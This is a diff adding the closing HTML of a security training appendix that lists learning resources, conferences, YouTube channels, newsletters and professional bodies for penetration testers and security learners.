+  <li><strong>OWASP.org</strong> — All top 10, ASVS, MASVS, MASTG</li>
+  <li><strong>HackerOne Hacktivity</strong> — Disclosed reports</li>
+  <li><strong>PortSwigger Web Security Academy</strong> — Free labs!</li>
+  <li><strong>Cisco Talos</strong> — Threat intel</li>
+  <li><strong>MITRE ATT&amp;CK</strong> — Adversary TTPs</li>
+  <li><strong>GTFOBins</strong> — Linux privilege escalation</li>
+  <li><strong>LOLBAS</strong> — Windows signed binaries</li>
+  <li><strong>Pwn.college</strong> — Modern exploitation learning</li>
+  <li><strong>Telegram security groups</strong> (RT, 0x00sec, Bug Bytes)</li>
+</ul>
+
+<h2>Conferences Worth Attending</h2>
+<div class="grid-3">
+<div class="card"><h4>🌎 Global</h4><p>DEF CON, Black Hat, RSA Conference</p></div>
+<div class="card"><h4>🌍 Europe</h4><p>OWASP Global, Nullcon</p></div>
+<div class="card"><h4>🌏 Asia</h4><p>Nullcon (India), CODE BLUE (Japan)</p></div>
+<div class="card"><h4>🌎 Americas</h4><p>BSides SF, RSA, CanSecWest</p></div>
+<div class="card"><h4>🎯 Specialist</h4><p>KubeCon (cloud), Nullcon (mobile)</p></div>
+<div class="card"><h4>🎓 Career</h4><p>OWASP events, ISC2 Congress</p></div>
+</div>
+
+<h2>YouTube Channels</h2>
+<ul>
+  <li><strong>John Hammond</strong> — CTFs, malware analysis</li>
+  <li><strong>NahamSec</strong> — Bug bounty tutorials</li>
+  <li><strong>IppSec</strong> — HackTheBox walkthroughs</li>
+  <li><strong>LiveOverflow</strong> — Binary exploitation</li>
+  <li><strong>The Cyber Mentor</strong> — Practical hacking</li>
+  <li><strong>NetworkChuck</strong> — Friendly intro</li>
+  <li><strong>Computerphile</strong> — Cryptography deep dives</li>
+  <li><strong>Bug Bounty Reports Explained</strong> by STÖK</li>
+</ul>
+
+<h2>Newsletters</h2>
+<ul>
+  <li><strong>Krebs on Security</strong></li>
+  <li><strong>The Hacker News</strong></li>
+  <li><strong>Risky Business</strong> (podcast + newsletter)</li>
+  <li><strong>Troy Hunt's blog</strong></li>
+  <li><strong>Darknet Diaries</strong> (podcast)</li>
+  <li><strong>SANS @RISK</strong></li>
+</ul>
+
+<h2>Standards Bodies &amp; Forums</h2>
+<ul>
+  <li><strong>(ISC)²</strong> — CISSP community</li>
+  <li><strong>ISACA</strong> — CISM/CRISC community</li>
+  <li><strong>CREST</strong> — Pentest accreditation</li>
+  <li><strong>NIST NICE</strong> — Cybersecurity workforce framework</li>
+  <li><strong>OWASP Foundation</strong> — Open appsec community</li>
+</ul>
+
+
+<div class="box success" style="margin-top:40px">
+<h3 style="margin-top:0">🎉 Appendix Complete!</h3>
+<p>You've now got ~5,000 lines of reference material to take to every engagement.
+Save this appendix URL as a browser bookmark!</p>
+</div>
+
+</main>
+
+<nav class="next-prev">
+<a href="part11-career.html" class="prev">⬅ Part 11 — Career Path</a>
+<a href="../index.html" class="next">🏠 Home</a>
+</nav>
+
+</body>
+</html>
